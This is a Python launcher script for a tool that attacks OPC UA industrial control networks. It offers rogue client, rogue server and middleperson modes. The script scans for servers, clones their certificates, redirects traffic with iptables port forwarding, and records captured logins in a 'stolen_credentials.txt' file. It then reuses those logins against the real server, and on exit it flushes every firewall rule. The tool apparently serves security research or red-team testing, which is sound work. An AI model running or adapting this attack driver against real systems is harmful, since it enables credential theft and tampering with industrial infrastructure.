#!/usr/bin/env -S sudo -E -S python3

import argparse
from utils.port_scanner import find_servers_and_select
from rogueclient.rogue_client import start_rogue_client, start_rogue_client_with_credentials
from rogueserver.rogue_server import copy_server_info_and_clone_certificate, enable_port_forwarding, start_rogue_server
import subprocess
import sys
from threading import Thread
import os
import time
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(
            description='A tool to implemnt rogue client, rogue server and middleperson attacks on OPC UA networks')
        parser.add_argument('-a', '--attack', choices=['rogue_client', 'rogue_server', 'middleperson'],
                            required=True, type=str, help='Instantates the selected attack in the local network')

        args = parser.parse_args()

        if args.attack == 'rogue_client':
            selected_server_address = find_servers_and_select(
                'Select the server you would like to connect: ')
            start_rogue_client(selected_server_address, '4840')
            while True:
                time.sleep(100)
        if args.attack == 'rogue_server':
            # select server to clone
            selected_server_address = find_servers_and_select(
                'Select the server you would like to clone: ')
            # copy server info and clone self-signed certificates
            server_info = copy_server_info_and_clone_certificate(
                selected_server_address, '4840')
            # enable port forwarding to redirect messages to the rogue server
            enable_port_forwarding(selected_server_address, '4840', '4841')
            # start the rogue server
            start_rogue_server(server_info)
            while True:
                time.sleep(100)
        if args.attack == 'middleperson':
            # select server to clone
            selected_server_address = find_servers_and_select(
                'Select the server you would like to clone: ')
            # copy server info and clone self-signed certificates
            server_info = copy_server_info_and_clone_certificate(
                selected_server_address, '4840')
            # enable port forwarding to redirect messages to the rogue server
            enable_port_forwarding(selected_server_address, '4840', '4841')
            # start the rogue server
            with open('stolen_credentials.txt', 'w') as f:
                pass
            thread = Thread(target=start_rogue_server, args=(server_info, ))
            thread.start()

            mtime = os.stat('stolen_credentials.txt').st_mtime
            while os.stat('stolen_credentials.txt').st_mtime == mtime:
                time.sleep(1)

            start_rogue_client_with_credentials(
                selected_server_address, '4841')
            while True:
                time.sleep(100)

    except KeyboardInterrupt:
        iptables_1 = subprocess.call(
            '/usr/sbin/iptables -F && /usr/sbin/iptables -t nat -F && /usr/sbin/iptables -t mangle -F && /usr/sbin/iptables -X', shell=True)
        sys.exit()